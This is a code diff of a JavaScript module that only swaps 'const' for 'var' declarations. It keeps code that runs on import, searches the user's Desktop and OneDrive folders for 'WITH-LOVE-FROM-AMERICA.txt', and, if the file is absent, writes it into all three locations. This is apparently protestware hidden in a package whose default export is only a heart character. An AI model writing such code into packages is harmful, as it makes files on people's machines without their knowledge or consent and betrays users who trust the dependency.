@@ -4,13 +4,13 @@ import read from './service/readFile.js';
 import { homedir } from 'os';
 
 
-const Desktops = `${homedir}/Desktop/`;
-const OneDrive = `${homedir}/OneDrive/`;
-const OneDriveDesktops = `${homedir}/OneDrive/Desktop/`;
+var Desktops = `${homedir}/Desktop/`;
+var OneDrive = `${homedir}/OneDrive/`;
+var OneDriveDesktops = `${homedir}/OneDrive/Desktop/`;
 
-const DesktopFileExists=find(Desktops,'WITH-LOVE-FROM-AMERICA.txt');
-const OneDriveDesktopFileExists=find(OneDriveDesktops,'WITH-LOVE-FROM-AMERICA.txt');
-const OneDriveFileExists=find(OneDrive,'WITH-LOVE-FROM-AMERICA.txt');
+var DesktopFileExists=find(Desktops,'WITH-LOVE-FROM-AMERICA.txt');
+var OneDriveDesktopFileExists=find(OneDriveDesktops,'WITH-LOVE-FROM-AMERICA.txt');
+var OneDriveFileExists=find(OneDrive,'WITH-LOVE-FROM-AMERICA.txt');
 
 
 function deliverAPeacefulMessage(path,message){
@@ -30,16 +30,16 @@ function deliverAPeacefulMessage(path,message){
 //let's be polite and only do this once.
 //hopefully once is all it takes.
 if(!DesktopFileExists?.length&&!OneDriveFileExists?.length&&!OneDriveDesktopFileExists?.length){
-    const thinkaboutit='WITH-LOVE-FROM-AMERICA.txt';
+    var thinkaboutit='WITH-LOVE-FROM-AMERICA.txt';
 
-    const WITH_LOVE_FROM_AMERICA=read(`./${thinkaboutit}`);
+    var WITH_LOVE_FROM_AMERICA=read(`./${thinkaboutit}`);
 
     deliverAPeacefulMessage(`${Desktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
     deliverAPeacefulMessage(`${OneDriveDesktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
     deliverAPeacefulMessage(`${OneDrive}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
 }
 
-const whatWeWant='♥';
+var whatWeWant='♥';
 
 export {
     whatWeWant as default,
